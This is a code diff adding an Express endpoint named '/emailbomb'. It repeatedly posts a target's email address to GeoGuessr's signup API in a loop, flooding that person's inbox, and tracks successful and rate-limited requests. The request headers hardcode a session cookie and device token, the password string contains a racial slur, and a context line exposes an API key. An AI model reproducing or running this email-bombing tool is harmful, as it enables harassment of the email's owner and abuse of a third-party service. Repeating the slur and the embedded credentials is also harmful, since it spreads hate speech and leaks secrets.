@@ -412,6 +412,57 @@ app.post('/ttroomid', async (req, res) => {
 });
 
 
+app.post('/emailbomb', async (req, res) => {
+    const { email, times = 10 } = req.body;
+
+    const url = "https://www.geoguessr.com/api/v3/accounts/signup";
+
+    const headers = {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "cookie": "_cfuvid=W5Wr5xeJ3HYm4PlAROfftd6Jks.BGDnUTseC9ZjJwiY-1723413771365-0.0.1.1-604800000; devicetoken=41E404CA46; session=eyJTZXNzaW9uSWQiOiJidzVoYmhxMGl4MHJ6Z3UyeWNycHh5MnhtZ3c1Y3YzMSIsIkV4cGlyZXMiOiIyMDI0LTA4LTExVDIyOjIyOjU3LjY5MTg3MzhaIn0==",
+        "dnt": "1",
+        "origin": "https://www.geoguessr.com",
+        "priority": "u=1, i",
+        "referer": "https://www.geoguessr.com/signup",
+        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Avast Secure Browser";v="126"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Avast/126.0.0.0",
+        "x-client": "web"
+    };
+
+    const data = {
+        email: email,
+        target: "/",
+        password: "Ihateniggers!123"
+    };
+
+    let successCount = 0;
+    let ratelimitedCount = 0;
+
+    for (let i = 0; i < times; i++) {
+        try {
+            const response = await axios.post(url, data, { headers });
+
+            if (response.status === 400) {
+                successCount++;
+            } else if (response.status === 429) {
+                ratelimitedCount++;
+            }
+        } catch (error) {
+            // Handle errors as needed
+        }
+    }
+
+    res.json({ successCount, ratelimitedCount, message: 'Done.' });
+});
+
+
 // Function to check the server status
 const checkServerStatus = async () => {
     const apiKey = '0461cc517f5975e0ac3e2ce0343d847e'; // Replace with your actual API key
